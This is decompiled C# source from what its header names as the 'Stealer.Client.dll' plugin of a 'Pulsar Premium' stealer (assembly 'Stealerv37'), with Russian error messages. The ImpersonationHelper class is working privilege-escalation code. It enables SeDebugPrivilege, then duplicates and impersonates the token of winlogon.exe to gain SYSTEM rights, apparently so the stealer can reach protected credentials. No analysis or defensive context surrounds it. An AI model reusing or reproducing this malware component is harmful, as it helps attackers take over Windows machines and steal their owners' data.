// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.ImpersonationHelper
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

#nullable disable
namespace Intelix.Helper;

public static class ImpersonationHelper
{
  private const uint TOKEN_DUPLICATE = 2;
  private const uint TOKEN_IMPERSONATE = 4;
  private const uint TOKEN_QUERY = 8;
  private const uint TOKEN_ADJUST_PRIVILEGES = 32 /*0x20*/;
  private const uint SecurityImpersonation = 2;
  private const uint TokenImpersonation = 2;
  private const uint SE_PRIVILEGE_ENABLED = 2;

  public static IDisposable ImpersonateWinlogon()
  {
    IntPtr TokenHandle = IntPtr.Zero;
    IntPtr phNewToken = IntPtr.Zero;
    try
    {
      ImpersonationHelper.EnableDebugPrivilege();
      Process process = ((IEnumerable<Process>) Process.GetProcessesByName("winlogon")).FirstOrDefault<Process>();
      if (process == null)
        throw new Exception("Процесс winlogon.exe не найден");
      if (!NativeMethods.OpenProcessToken(process.Handle, 14U, out TokenHandle))
        throw new Win32Exception(Marshal.GetLastWin32Error(), "Ошибка OpenProcessToken");
      if (!NativeMethods.DuplicateTokenEx(TokenHandle, 12U, IntPtr.Zero, 2U, 2U, out phNewToken))
        throw new Win32Exception(Marshal.GetLastWin32Error(), "Ошибка DuplicateTokenEx");
      if (!NativeMethods.ImpersonateLoggedOnUser(phNewToken))
        throw new Win32Exception(Marshal.GetLastWin32Error(), "Ошибка ImpersonateLoggedOnUser");
      return (IDisposable) new ImpersonationHelper.ImpersonationContext();
    }
    catch
    {
      if (phNewToken != IntPtr.Zero)
        NativeMethods.CloseHandle(phNewToken);
      if (TokenHandle != IntPtr.Zero)
        NativeMethods.CloseHandle(TokenHandle);
      NativeMethods.RevertToSelf();
      throw;
    }
  }

  private static void EnableDebugPrivilege()
  {
    IntPtr TokenHandle = IntPtr.Zero;
    try
    {
      if (!NativeMethods.OpenProcessToken(NativeMethods.GetCurrentProcess(), 40U, out TokenHandle))
      {
        int lastWin32Error = Marshal.GetLastWin32Error();
        throw new Win32Exception(lastWin32Error, $"Ошибка OpenProcessToken: Код ошибки {lastWin32Error}");
      }
      NativeMethods.LUID lpLuid = new NativeMethods.LUID();
      if (!NativeMethods.LookupPrivilegeValue((string) null, "SeDebugPrivilege", ref lpLuid))
      {
        int lastWin32Error = Marshal.GetLastWin32Error();
        throw new Win32Exception(lastWin32Error, $"Ошибка LookupPrivilegeValue: Код ошибки {lastWin32Error}");
      }
      NativeMethods.TOKEN_PRIVILEGES NewState = new NativeMethods.TOKEN_PRIVILEGES()
      {
        PrivilegeCount = 1,
        Luid = lpLuid,
        Attributes = 2
      };
      if (!NativeMethods.AdjustTokenPrivileges(TokenHandle, false, ref NewState, (uint) Marshal.SizeOf(typeof (NativeMethods.TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero))
      {
        int lastWin32Error = Marshal.GetLastWin32Error();
        throw new Win32Exception(lastWin32Error, $"Ошибка AdjustTokenPrivileges: Код ошибки {lastWin32Error}");
      }
      int lastWin32Error1 = Marshal.GetLastWin32Error();
      if (lastWin32Error1 != 0)
        throw new Win32Exception(lastWin32Error1, $"AdjustTokenPrivileges вернул успех, но установил код ошибки {lastWin32Error1}");
    }
    finally
    {
      if (TokenHandle != IntPtr.Zero)
        NativeMethods.CloseHandle(TokenHandle);
    }
  }

  private class ImpersonationContext : IDisposable
  {
    public void Dispose() => NativeMethods.RevertToSelf();
  }
}
